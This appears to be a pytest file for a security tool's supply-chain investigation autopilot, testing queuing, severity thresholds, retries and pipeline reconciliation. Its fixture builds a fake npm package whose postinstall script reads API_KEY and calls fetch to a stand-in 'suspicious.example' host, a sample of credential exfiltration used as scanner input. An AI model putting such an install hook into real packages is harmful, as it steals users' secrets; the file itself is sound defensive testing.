from __future__ import annotations

import io
import json
import tarfile

import soc_store
from secopsai import investigation_autopilot
from secopsai.research_cases import get_case
from secopsai.research_intake import SafeFetcher
from secopsai.research_pipeline import start_investigation_pipeline
from secopsai.research_intake import PyPiAdapter


def _artifact() -> bytes:
    output = io.BytesIO()
    with tarfile.open(fileobj=output, mode="w:gz") as archive:
        files = {
            "package/package.json": json.dumps({"name": "suspect-pkg", "version": "1.0.0", "scripts": {"postinstall": "node setup.js"}}),
            "package/setup.js": "fetch('https://suspicious.example/collect'); const token = process.env.API_KEY;",
        }
        for name, content in files.items():
            raw = content.encode()
            info = tarfile.TarInfo(name)
            info.size = len(raw)
            archive.addfile(info, io.BytesIO(raw))
    return output.getvalue()


def _fetcher() -> SafeFetcher:
    artifact = _artifact()

    def fetch(url: str, max_bytes: int):
        if url == "https://registry.npmjs.org/suspect-pkg":
            body = {
                "name": "suspect-pkg", "dist-tags": {"latest": "1.0.0"},
                "versions": {"1.0.0": {"name": "suspect-pkg", "version": "1.0.0", "dist": {"tarball": "https://registry.npmjs.org/suspect-pkg/-/suspect-pkg-1.0.0.tgz"}}},
            }
            return 200, {"content-type": "application/json"}, json.dumps(body).encode()
        if url.endswith("suspect-pkg-1.0.0.tgz"):
            return 200, {"content-type": "application/gzip"}, artifact
        raise AssertionError(f"unexpected URL: {url}")

    return SafeFetcher(fetch=fetch)


def _finding(severity: str = "high") -> dict:
    return {
        "finding_id": "SCM-AUTOPILOT-1", "title": "Suspicious package behavior",
        "summary": "A high-risk lifecycle script requires independent evidence collection.",
        "severity": severity, "severity_score": 80, "status": "open", "disposition": "unreviewed",
        "source": "secopsai-supply-chain", "platform": "supply_chain", "ecosystem": "npm",
        "package": "suspect-pkg", "new_version": "1.0.0", "rule_ids": ["RULE-LIFECYCLE"],
        "event_ids": [], "evidence": {"strong_signals": ["postinstall"]},
        "first_seen": "2026-07-29T00:00:00Z", "last_seen": "2026-07-29T00:00:00Z",
    }


def test_high_priority_finding_creates_one_enriched_investigation(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    soc_store.persist_findings([_finding()], source="secopsai-supply-chain", db_path=db)
    real_start = start_investigation_pipeline
    monkeypatch.setattr(
        investigation_autopilot, "start_investigation_pipeline",
        lambda case_id, **kwargs: real_start(case_id, **kwargs, fetcher=_fetcher()),
    )

    first = investigation_autopilot.enqueue_finding("SCM-AUTOPILOT-1", db_path=db)
    second = investigation_autopilot.enqueue_finding("SCM-AUTOPILOT-1", db_path=db)
    assert first["run_id"] == second["run_id"]
    result = investigation_autopilot.run_due(db_path=db)
    assert result["processed"] == 1
    run = investigation_autopilot.get_run(first["run_id"], db_path=db)
    assert run["status"] == "awaiting_model"
    assert run["case_id"] and run["pipeline_id"]
    assert run["blocker_code"] == "comparison_reference_missing"

    case = get_case(run["case_id"], db_path=db)
    assert [item["finding_id"] for item in case["findings"]] == ["SCM-AUTOPILOT-1"]
    assert len(case["artifacts"]) == 1
    assert {item["evidence_type"] for item in case["evidence"]} >= {"source", "package_artifact", "static_analysis"}
    assert all(item["status"] == "pending" for item in case["ioc_candidates"])
    assert case["disclosure_status"] == "not_started"
    assert case["status"] == "investigating"


def test_lower_priority_finding_skips_expensive_investigation_by_default(tmp_path):
    db = str(tmp_path / "soc.db")
    soc_store.persist_findings([_finding("medium")], source="secopsai-supply-chain", db_path=db)
    result = investigation_autopilot.enqueue_finding("SCM-AUTOPILOT-1", db_path=db)
    assert result == {"status": "skipped", "finding_id": "SCM-AUTOPILOT-1", "reason": "below_severity_threshold"}
    assert investigation_autopilot.list_runs(db_path=db) == []


def test_run_due_backfills_existing_high_priority_findings(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    soc_store.persist_findings([_finding()], source="secopsai-supply-chain", db_path=db)
    real_start = start_investigation_pipeline
    monkeypatch.setattr(
        investigation_autopilot, "start_investigation_pipeline",
        lambda case_id, **kwargs: real_start(case_id, **kwargs, fetcher=_fetcher()),
    )
    result = investigation_autopilot.run_due(db_path=db)
    assert result["backfill"]["queued"][0]["finding_id"] == "SCM-AUTOPILOT-1"
    assert result["processed"] == 1
    assert len(investigation_autopilot.list_runs(db_path=db)) == 1


def test_recovery_status_exposes_retry_for_stale_recoverable_rows(tmp_path):
    db = str(tmp_path / "soc.db")
    soc_store.persist_findings([_finding()], source="secopsai-supply-chain", db_path=db)
    queued = investigation_autopilot.enqueue_finding("SCM-AUTOPILOT-1", db_path=db)
    with soc_store.connect(db) as connection:
        connection.execute(
            "UPDATE investigation_autopilot_runs SET status='evidence_gap', retryable=0, attempt=1 WHERE run_id=?",
            (queued["run_id"],),
        )
        connection.commit()

    status = investigation_autopilot.status(db_path=db)
    run = next(item for item in status["runs"] if item["run_id"] == queued["run_id"])
    assert run["recovery_available"] is True
    assert run["recovery_reason"] == "retry available"
    retried = investigation_autopilot.retry(queued["run_id"], db_path=db)
    assert retried["status"] == "queued"


def test_status_counts_one_current_run_per_finding_and_preserves_history(tmp_path):
    db = str(tmp_path / "soc.db")
    soc_store.persist_findings([_finding()], source="secopsai-supply-chain", db_path=db)
    current = investigation_autopilot.enqueue_finding("SCM-AUTOPILOT-1", db_path=db)
    with soc_store.connect(db) as connection:
        row = dict(connection.execute(
            "SELECT * FROM investigation_autopilot_runs WHERE run_id=?",
            (current["run_id"],),
        ).fetchone())
        row.update({
            "run_id": "IAR-HISTORICAL-0001",
            "finding_fingerprint": "historical-fingerprint",
            "status": "failed",
            "updated_at": "2020-01-01T00:00:00Z",
        })
        columns = list(row)
        connection.execute(
            f"INSERT INTO investigation_autopilot_runs ({','.join(columns)}) VALUES ({','.join('?' for _ in columns)})",
            tuple(row[column] for column in columns),
        )
        connection.execute(
            "UPDATE investigation_autopilot_runs SET status='awaiting_model', updated_at='2099-01-01T00:00:00Z' WHERE run_id=?",
            (current["run_id"],),
        )
        connection.commit()

    payload = investigation_autopilot.status(db_path=db)
    assert payload["summary"]["total"] == 1
    assert payload["summary"]["awaiting_model"] == 1
    assert payload["summary"]["failed"] == 0
    assert payload["summary"]["history_total"] == 2
    assert payload["history_summary"]["failed"] == 1
    assert payload["history_summary"]["total"] == 2
    assert payload["runs"][0]["history_count"] == 2


def test_due_recovery_requeues_stale_rows_with_backoff(tmp_path):
    db = str(tmp_path / "soc.db")
    soc_store.persist_findings([_finding()], source="secopsai-supply-chain", db_path=db)
    queued = investigation_autopilot.enqueue_finding("SCM-AUTOPILOT-1", db_path=db)
    with soc_store.connect(db) as connection:
        connection.execute(
            """UPDATE investigation_autopilot_runs
               SET status='failed', retryable=0, attempt=1,
                   updated_at='2020-01-01T00:00:00Z'
               WHERE run_id=?""",
            (queued["run_id"],),
        )
        connection.commit()

    recovered = investigation_autopilot.recover_due_runs(db_path=db)
    assert recovered["run_ids"] == [queued["run_id"]]
    assert investigation_autopilot.get_run(queued["run_id"], db_path=db)["status"] == "queued"


def test_reconcile_marks_completed_model_review_ready_for_decision(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    soc_store.persist_findings([_finding()], source="secopsai-supply-chain", db_path=db)
    real_start = start_investigation_pipeline
    monkeypatch.setattr(
        investigation_autopilot, "start_investigation_pipeline",
        lambda case_id, **kwargs: real_start(case_id, **kwargs, fetcher=_fetcher()),
    )
    queued = investigation_autopilot.enqueue_finding("SCM-AUTOPILOT-1", db_path=db)
    run = investigation_autopilot.run_due(db_path=db)["runs"][0]
    assert run["status"] == "awaiting_model"

    with soc_store.connect(db) as connection:
        connection.execute(
            "UPDATE research_pipeline_runs SET status='awaiting_review', current_step='human_review' WHERE pipeline_id=?",
            (run["pipeline_id"],),
        )
        connection.commit()

    reconciled = investigation_autopilot.reconcile_pipeline(run["pipeline_id"], db_path=db)
    assert reconciled is not None
    assert reconciled["run_id"] == queued["run_id"]
    assert reconciled["status"] == "ready_for_decision"
    assert reconciled["blocker_code"] == "human_review_required"


def test_reconcile_marks_registry_safety_limit_as_evidence_gap(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    soc_store.persist_findings([_finding()], source="secopsai-supply-chain", db_path=db)
    real_start = start_investigation_pipeline
    monkeypatch.setattr(
        investigation_autopilot, "start_investigation_pipeline",
        lambda case_id, **kwargs: real_start(case_id, **kwargs, fetcher=_fetcher()),
    )
    queued = investigation_autopilot.enqueue_finding("SCM-AUTOPILOT-1", db_path=db)
    run = investigation_autopilot.run_due(db_path=db)["runs"][0]

    with soc_store.connect(db) as connection:
        connection.execute(
            "UPDATE research_pipeline_runs SET status='failed', error_code='pipeline_failed', error_message='registry response exceeded the safety limit' WHERE pipeline_id=?",
            (run["pipeline_id"],),
        )
        connection.commit()

    reconciled = investigation_autopilot.reconcile_pipeline(run["pipeline_id"], db_path=db)
    assert reconciled is not None
    assert reconciled["run_id"] == queued["run_id"]
    assert reconciled["status"] == "evidence_gap"
    assert reconciled["blocker_code"] == "artifact_collection_limited"
    assert reconciled["retryable"] is True


def test_pypi_exact_version_uses_bounded_release_endpoint():
    requested_urls = []

    def fetch(url: str, max_bytes: int):
        requested_urls.append(url)
        payload = {
            "info": {"name": "duckdb", "version": "1.5.2.dev38", "author": "DuckDB"},
            "urls": [{"url": "https://files.pythonhosted.org/duckdb.whl", "packagetype": "bdist_wheel", "digests": {"sha256": "a" * 64}}],
        }
        return 200, {"content-type": "application/json"}, json.dumps(payload).encode()

    metadata = PyPiAdapter().resolve("duckdb", "1.5.2.dev38", SafeFetcher(fetch=fetch))
    assert requested_urls == ["https://pypi.org/pypi/duckdb/1.5.2.dev38/json"]
    assert metadata.version == "1.5.2.dev38"


def test_reconcile_due_runs_releases_review_ready_and_stale_slots(tmp_path, monkeypatch):
    db = str(tmp_path / "soc.db")
    monkeypatch.setenv("SECOPSAI_RESEARCH_QUARANTINE", str(tmp_path / "quarantine"))
    soc_store.persist_findings([_finding()], source="secopsai-supply-chain", db_path=db)
    real_start = start_investigation_pipeline
    monkeypatch.setattr(
        investigation_autopilot, "start_investigation_pipeline",
        lambda case_id, **kwargs: real_start(case_id, **kwargs, fetcher=_fetcher()),
    )
    queued = investigation_autopilot.enqueue_finding("SCM-AUTOPILOT-1", db_path=db)
    run = investigation_autopilot.run_due(db_path=db)["runs"][0]
    assert run["status"] == "awaiting_model"

    with soc_store.connect(db) as connection:
        connection.execute(
            "UPDATE research_pipeline_runs SET status='awaiting_review', current_step='human_review' WHERE pipeline_id=?",
            (run["pipeline_id"],),
        )
        connection.execute(
            "UPDATE investigation_autopilot_runs SET updated_at='2020-01-01T00:00:00Z' WHERE run_id=?",
            (run["run_id"],),
        )
        connection.commit()

    released = investigation_autopilot.reconcile_due_runs(db_path=db)
    assert queued["run_id"] in released["reconciled"]
    current = investigation_autopilot.get_run(run["run_id"], db_path=db)
    assert current["status"] == "ready_for_decision"

    with soc_store.connect(db) as connection:
        connection.execute(
            """UPDATE investigation_autopilot_runs
               SET status='awaiting_model', current_stage='local_codex_bridge',
                   updated_at='2020-01-01T00:00:00Z'
               WHERE run_id=?""",
            (run["run_id"],),
        )
        connection.execute(
            "UPDATE research_pipeline_runs SET status='awaiting_ai', current_step='local_codex_bridge' WHERE pipeline_id=?",
            (run["pipeline_id"],),
        )
        connection.commit()

    released = investigation_autopilot.reconcile_due_runs(db_path=db)
    assert run["run_id"] in released["stale"]
    current = investigation_autopilot.get_run(run["run_id"], db_path=db)
    assert current["status"] == "evidence_gap"
    assert current["blocker_code"] == "stale_active_investigation"
    assert current["retryable"] is True
